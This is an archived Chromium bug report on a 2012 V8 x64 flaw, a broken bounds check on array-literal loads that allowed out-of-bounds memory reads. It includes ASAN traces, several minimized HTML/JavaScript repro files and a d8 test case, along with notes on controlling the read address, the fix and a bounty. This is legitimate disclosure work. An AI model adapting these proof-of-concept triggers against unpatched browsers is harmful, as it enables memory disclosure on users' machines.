# UNKNOWN in v8::internal::Invoke

| Field | Value |
|-------|-------|
| **Issue ID** | [40076317](https://issues.chromium.org/issues/40076317) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink, Blink>JavaScript |
| **Platforms** | Linux |
| **Reporter** | at...@gmail.com |
| **Assignee** | jk...@chromium.org |
| **Created** | 2012-09-19 |
| **Bounty** | $1,500.00 |

## Description

Repro-file as attachment.

The repro-file did cause crash on official unstable and beta release but didn't cause crash on stable-channel Chrome. 

I will try to analyze and minimize the repro-file as soon as I have some spare time.

OS: Ubuntu 12.04 x86_64

Google Chrome	22.0.1229.56 (Official Build 156464) beta
JavaScript	V8 3.12.19.8

[ 1651.616137] chrome[25758]: segfault at 40c415ceb68 ip 000009c7b4f6e4d9 sp 00007fff8a6ea788 error 4
[ 1651.631707] chrome[25754]: segfault at 23f94b5ceb68 ip 000011314496e4d9 sp 00007fff8a6ea788 error 4

Chromium ASAN Debug	23.0.1271.0 (Developer Build 157482)
JavaScript	V8 3.13.7.1

ASAN-report:
==31336== ERROR: AddressSanitizer crashed on unknown address 0x3fa73d5e70d8 (pc 0x336985760779 sp 0x7fffa25f6d40 bp 0x7fffa25f6fd0 T0)
AddressSanitizer can not provide additional info.
    #0 0x336985760778 in  
    #1 0x336985724186 in  
    #2 0x336985711336 in  
    #3 0x7f022628ec81 in v8::internal::Invoke(bool, v8::internal::Handle<v8::internal::JSFunction>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, bool*) /b/build/slave/ASAN_Debug/build/v8/src/execution.cc:118
    #4 0x7f022628c4b7 in v8::internal::Execution::Call(v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, bool*, bool) /b/build/slave/ASAN_Debug/build/v8/src/execution.cc:179
    #5 0x7f0225d07e32 in v8::Script::Run() /b/build/slave/ASAN_Debug/build/v8/src/api.cc:1615
    #6 0x7f0218f76ff6 in WebCore::ScriptRunner::runCompiledScript(v8::Handle<v8::Script>, WebCore::ScriptExecutionContext*) /b/build/slave/ASAN_Debug/build/third_party/WebKit/Source/WebCore/bindings/v8/ScriptRunner.cpp:54
    #7 0x7f0218eb9667 in WebCore::ScriptController::compileAndRunScript(WebCore::ScriptSourceCode const&) /b/build/slave/ASAN_Debug/build/third_party/WebKit/Source/WebCore/bindings/v8/ScriptController.cpp:283
    #8 0x7f0218e6a0bb in WebCore::ScheduledAction::execute(WebCore::Frame*) /b/build/slave/ASAN_Debug/build/third_party/WebKit/Source/WebCore/bindings/v8/ScheduledAction.cpp:103
    #9 0x7f0218e68cc3 in WebCore::ScheduledAction::execute(WebCore::ScriptExecutionContext*) /b/build/slave/ASAN_Debug/build/third_party/WebKit/Source/WebCore/bindings/v8/ScheduledAction.cpp:77
    #10 0x7f021b14dc32 in WebCore::DOMTimer::fired() /b/build/slave/ASAN_Debug/build/third_party/WebKit/Source/WebCore/page/DOMTimer.cpp:136
.
.
.


## Attachments

- [chrome-crashed-undefined-4f99.html](attachments/chrome-crashed-undefined-4f99.html) (application/octet-stream; charset=binary, 1.7 KB)

## Timeline

### in...@chromium.org (2012-09-19)

[Empty comment from Monorail migration]

### at...@gmail.com (2012-09-19)

I minimized the repro-file.

<!doctype html>
<html>
<body>
<script> 
	setInterval(function(){
		i=[t*.7,1,t*.6];
		var M=[i[0],i[1],Math.cos(t*.6)*20+i[7074959]+14];
		for(x=0;x<6400;x++){
			for(f=0;f<70;){
				f+=10;
			}
		}
		t+=.05
	},t=0)
</script>
</body>
</html>

While minimizing the stack trace changed little.

ASAN-report:

==31259== ERROR: AddressSanitizer crashed on unknown address 0x7f07545da0b8 (pc 0x2cad06d40741 sp 0x7fffcdee0b78 bp 0x7fffcdee0bd0 T0)
AddressSanitizer can not provide additional info.
    #0 0x2cad06d40740 in  
    #1 0x2cad06d24186 in  
    #2 0x2cad06d11336 in  
    #3 0x7f077a032c81 in v8::internal::Invoke(bool, v8::internal::Handle<v8::internal::JSFunction>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, bool*) /b/build/slave/ASAN_Debug/build/v8/src/execution.cc:118
    #4 0x7f077a0304b7 in v8::internal::Execution::Call(v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, bool*, bool) /b/build/slave/ASAN_Debug/build/v8/src/execution.cc:179
    #5 0x7f0779b0b532 in v8::Function::Call(v8::Handle<v8::Object>, int, v8::Handle<v8::Value>*) /b/build/slave/ASAN_Debug/build/v8/src/api.cc:3662
    #6 0x7f076cc59cfe in WebCore::ScriptController::callFunctionWithInstrumentation(WebCore::ScriptExecutionContext*, v8::Handle<v8::Function>, v8::Handle<v8::Object>, int, v8::Handle<v8::Value>*) /b/build/slave/ASAN_Debug/build/third_party/WebKit/Source/WebCore/bindings/v8/ScriptController.cpp:235
    #7 0x7f076cc588d2 in WebCore::ScriptController::callFunction(v8::Handle<v8::Function>, v8::Handle<v8::Object>, int, v8::Handle<v8::Value>*) /b/build/slave/ASAN_Debug/build/third_party/WebKit/Source/WebCore/bindings/v8/ScriptController.cpp:188
    #8 0x7f076cc0e012 in WebCore::ScheduledAction::execute(WebCore::Frame*) /b/build/slave/ASAN_Debug/build/third_party/WebKit/Source/WebCore/bindings/v8/ScheduledAction.cpp:101
    #9 0x7f076cc0ccc3 in WebCore::ScheduledAction::execute(WebCore::ScriptExecutionContext*) /b/build/slave/ASAN_Debug/build/third_party/WebKit/Source/WebCore/bindings/v8/ScheduledAction.cpp:77
    #10 0x7f076eef1c32 in WebCore::DOMTimer::fired() /b/build/slave/ASAN_Debug/build/third_party/WebKit/Source/WebCore/page/DOMTimer.cpp:136
.
.
.


### at...@gmail.com (2012-09-19)

If you change the latter index of i in calculation of var M you can change the crash address. Every +1 seems to increase the crash address by 8 and you can manipulate at max the 7 lowest hex. The resulting crash address seems to change depending on computer you are using but will stay the same even if you restart the browser.

You can also manipulate the pc if you change the calculation for value i[0]. You still must have include variable t. So far I haven't been able to get accurate control for pc.

Here is little more optimized version of the repro-file.

<!doctype html>
<html>
<body>
	<script> 
		setInterval( function(){ 
			i=[t,1]; 
			var M=[i[0],Math.cos(0)+i[480458]]; 
			for(x=0;x<20000;x++){ 
				for(f=0;f<100;){ 
					f+=10; 
				} 
			} 
			t+=0.001 
		},t=0)
	</script>
</body>
</html>

Cause nice address with my laptop. 

==14288== ERROR: AddressSanitizer crashed on unknown address 0x349a8f313370 (pc 0x319ddb040daf sp 0x7fffdcf96720 bp 0x7fffdcf96770 T0)
==14327== ERROR: AddressSanitizer crashed on unknown address 0x3e1f15313370 (pc 0x31513f840daf sp 0x7fff4941d260 bp 0x7fff4941d2b0 T0)
==15576== ERROR: AddressSanitizer crashed on unknown address 0x234545313370 (pc 0x2d086f540daf sp 0x7fff32058620 bp 0x7fff32058670 T0)

but on my second machine

==20753== ERROR: AddressSanitizer crashed on unknown address 0x372415313af0 (pc 0x3233de940def sp 0x7fff7dc12de0 bp 0x7fff7dc12e30 T0)
==9436== ERROR: AddressSanitizer crashed on unknown address 0x31ba81313af0 (pc 0x3e9142a40def sp 0x7fff3c3ed500 bp 0x7fff3c3ed550 T0)



### in...@chromium.org (2012-09-19)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=111509453

Uploader: inferno@chromium.org

Crash Type: UNKNOWN
Crash Address: 0x02058f5c5bd8
Crash State:
  - crash stack -
  v8::internal::Invoke
  v8::Script::Run
  WebCore::ScriptRunner::runCompiledScript
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=150627:150709

Minimized Testcase (1.31 Kb): https://cluster-fuzz.appspot.com/download/AMIfv956X6S0_nMPqJNV9EkRTaPFaqs6B9-IsNgDiHku7fNMTJ5Wj1BjFOvDDh9NYc5dcMSzQlbbNWsYf-5unsAu1TqwI00fRD1FAnj_cMAta863-Ev-kDjpVxwdBInH2OK2fotQY-6huGrhSuxBefTVdcaQbZSrrb5sA05wizbnzj-cdFel6w0

### jk...@chromium.org (2012-09-19)

d8-ified test case:

var t = 0;
function burn() {
  i = [t, 1];
  var M = [i[0], Math.cos(t) + i[7074959]];
  t += .05;
}
for (var j = 0; j < 5; j++) {
  if (j == 2) %OptimizeFunctionOnNextCall(burn);
  burn();
}

Something's wrong with the bounds check for the "i" array literal.

attekett: thanks for reporting this, and great work on minimizing it! One correction though: the array index does not actually influence the pc, just the address that the code tries to read from (but not jump to).

### at...@gmail.com (2012-09-19)

I'm not sure about what actually happens there but this is what I observed.

Value:
i=[t,1];
Result: 
==2919== ERROR: AddressSanitizer crashed on unknown address 0x3440dd313370 (pc 0x014be9640daf sp 0x7fff63d5dd40 bp 0x7fff63d5dd90 T0)  

i=[t*0.1,1]; 
==3098== ERROR: AddressSanitizer crashed on unknown address 0x32c17d313380 (pc 0x7fbd05241062 sp 0x7fff97b50940 bp 0x7fff97b50990 T0)

i=[t*2,1];
==3137== ERROR: AddressSanitizer crashed on unknown address 0x3fb659313380 (pc 0x7f2c6d541142 sp 0x7fff0b559d20 bp 0x7fff0b559d70 T0)

Used repro-file from https://crbug.com/chromium/150729#c3 and didn't change anything else than the value of i[0], the value for pc ASAN-reports changes when the value is changed. I'm not sure if that is worth anything but thought that I should note it. :)

### jk...@chromium.org (2012-09-20)

Fixed in V8 bleeding_edge r12562. Chromium roll pending (we'll try it today, but the first roll after a branch tends to have trouble sticking).

This issue only affects x64.

@https://crbug.com/chromium/150729#c6: I'm not too familiar with reading ASAN output. This crash happened in generated code which can sit at pretty arbitrary addresses, somewhere on the JS heap; that might explain the changing addresses. Anyway, we did not jump to random addresses, we just tried to read from them (e.g. "movsd xmm2,[rax+0x35fa487]").

### at...@gmail.com (2012-09-20)

Yeah. Looks like I was way off with the control of pc. First time I have seen an issue being triggered from a generated code. Thanks for the info. :)

### in...@chromium.org (2012-09-20)

Please do merge to m22 when you get a chance. Thanks a lot for your comments that it is just reads.

### sc...@gmail.com (2012-09-20)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-09-20)

@attekeet, @jkummerow, just checking: what is the _result_ of that wild read used for? e.g. if it's used as an index or some index bound, we could still have a serious bad _write_ condition :-)

### jk...@chromium.org (2012-09-20)

@11: In the repro case, the result of the read is stored as element in an array (literal). It's not used as index, only as value.
The line in question (from my repro case in https://crbug.com/chromium/150729#c5) is:
var M = [i[0], Math.cos(t) + i[7074959]];
where the bounds check before accessing i[7074959] (the actual constant doesn't matter) is dysfunctional (essentially, it always succeeds). If the read succeeds (which it does if you pick a small constant so it's not SIGSEGV), the result is added to Math.cos(t) and stored in M[1].

Just to be sure I've tried to construct a repro case that triggers a similar situation for a write to an out-of-bounds address, but failed. At this time I believe the problem only appears when an array load happens inside an array literal (and some additional circumstances must also be at play); and that it is not possible to abuse the broken bounds check to construct a write to an arbitrary address, because array stores ("i[7074959] = 0xDEAD;") are handled very differently from array literals.

### sc...@gmail.com (2012-09-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2012-09-22)

ClusterFuzz has detected this issue as fixed in range 157980:157999.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=111509453

Uploader: inferno@chromium.org

Crash Type: UNKNOWN
Crash Address: 0x02058f5c5bd8
Crash State:
  - crash stack -
  v8::internal::Invoke
  v8::Script::Run
  WebCore::ScriptRunner::runCompiledScript
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=150627:150709
Fixed: https://cluster-fuzz.appspot.com/revisions?range=157980:157999

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv956X6S0_nMPqJNV9EkRTaPFaqs6B9-IsNgDiHku7fNMTJ5Wj1BjFOvDDh9NYc5dcMSzQlbbNWsYf-5unsAu1TqwI00fRD1FAnj_cMAta863-Ev-kDjpVxwdBInH2OK2fotQY-6huGrhSuxBefTVdcaQbZSrrb5sA05wizbnzj-cdFel6w0

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### ke...@google.com (2012-09-24)

If this is merged, please update the labels.

### sc...@gmail.com (2012-09-25)

This bug will affect M22 stable so adding tag. Hopefully just briefly until the first patch, though :)

### sc...@gmail.com (2012-09-25)

@attekett: interesting bug and thanks for all your repros and demos of wild OOB array reads :D

We'll reward $500 base for the OOB read plus a $1000 bonus because the issue looks like a pretty readily exploitable information leak.

### jk...@chromium.org (2012-09-25)

Fix back-merged to M22 (V8 version 3.12.19.13), but not yet to M23.

@attekett: Yeah, great work on providing and minimizing the repro case! Thanks a lot!

### at...@gmail.com (2012-09-25)

@jkummerow: Thanks! Great to know that the work is appreciated. This was one of the most interesting issues I have worked with in long time. 

### sc...@gmail.com (2012-10-12)

Paid as part of $7633.70 batch

### ms...@chromium.org (2012-10-12)

Merged to V8 3.13 branch (Chrome M23) in v8:r12716.

https://code.google.com/p/v8/source/detail?r=12716

### sc...@gmail.com (2012-10-14)

Thanks @mstartzinger. Yeah, at this stage, I think M23 is fine. It's fast approaching so no need for the hassle of an M22 backport.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-01-30)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-05)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/150729?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink, Blink>JavaScript]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40076317)*
